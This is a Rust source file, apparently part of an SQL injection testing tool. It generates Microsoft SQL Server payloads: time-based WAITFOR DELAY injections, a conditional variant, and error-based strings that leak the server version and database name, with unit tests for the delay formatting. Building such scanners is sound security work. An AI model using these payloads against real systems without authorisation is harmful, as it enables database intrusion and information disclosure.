#![deny(unsafe_code)]

/// Format `secs` as a MSSQL `WAITFOR DELAY` literal `HH:MM:SS`.
///
/// Two-digit zero-padded fields; supports `>= 10s`, `>= 60s` and `>= 1h`
/// (e.g. `5` -> `00:00:05`, `65` -> `00:01:05`, `3661` -> `01:01:01`).
/// Single source of truth for every WAITFOR payload in the crate.
#[must_use]
pub fn waitfor_delay_literal(secs: u64) -> String {
    let h = secs / 3600;
    let m = (secs % 3600) / 60;
    let sec = secs % 60;
    format!("{h:02}:{m:02}:{sec:02}")
}

#[must_use]
pub fn mssql_time(secs: u64) -> String {
    format!("'; WAITFOR DELAY '{}' --", waitfor_delay_literal(secs))
}

/// Conditional variant: only sleeps when the injected condition holds,
/// reducing false positives vs the unconditional legacy payload.
#[must_use]
pub fn mssql_time_conditional(secs: u64) -> String {
    format!(
        "'; IF(1=1) WAITFOR DELAY '{}' --",
        waitfor_delay_literal(secs)
    )
}

/// Canonical MSSQL error-based set — legacy first (compat), then variants.
///
/// - `[0]` legacy `CONVERT(int,@@version)` — Msg 8114 channel
/// - `[1]` legacy `CONVERT(int,DB_NAME())`
/// - `CAST(@@version AS int)` — Msg 245 (`Conversion failed ... varchar`)
///   alternate spelling of the same `CONVERT` channel
/// - `FOR XML PATH('')` — `FOR XML` error exfil channel
#[must_use]
pub fn mssql_error_payloads() -> Vec<String> {
    vec![
        "' AND CONVERT(int,@@version) --".to_owned(),
        "' AND 1=CONVERT(int,DB_NAME()) --".to_owned(),
        "' AND CAST((SELECT @@version) AS int) --".to_owned(),
        "' AND 1 IN (SELECT @@version FOR XML PATH('')) --".to_owned(),
    ]
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn waitfor_literal_pads_single_digit() {
        assert_eq!(waitfor_delay_literal(5), "00:00:05");
    }

    #[test]
    fn waitfor_literal_handles_tens_and_minutes() {
        assert_eq!(waitfor_delay_literal(10), "00:00:10");
        assert_eq!(waitfor_delay_literal(65), "00:01:05");
    }

    #[test]
    fn waitfor_literal_handles_hours() {
        assert_eq!(waitfor_delay_literal(3661), "01:01:01");
    }

    #[test]
    fn mssql_time_uses_literal() {
        assert_eq!(mssql_time(5), "'; WAITFOR DELAY '00:00:05' --");
        assert_eq!(mssql_time(10), "'; WAITFOR DELAY '00:00:10' --");
    }

    #[test]
    fn mssql_conditional_embeds_if() {
        let p = mssql_time_conditional(5);
        assert!(p.contains("IF(1=1)"), "{p}");
        assert!(p.contains("00:00:05"), "{p}");
    }
}
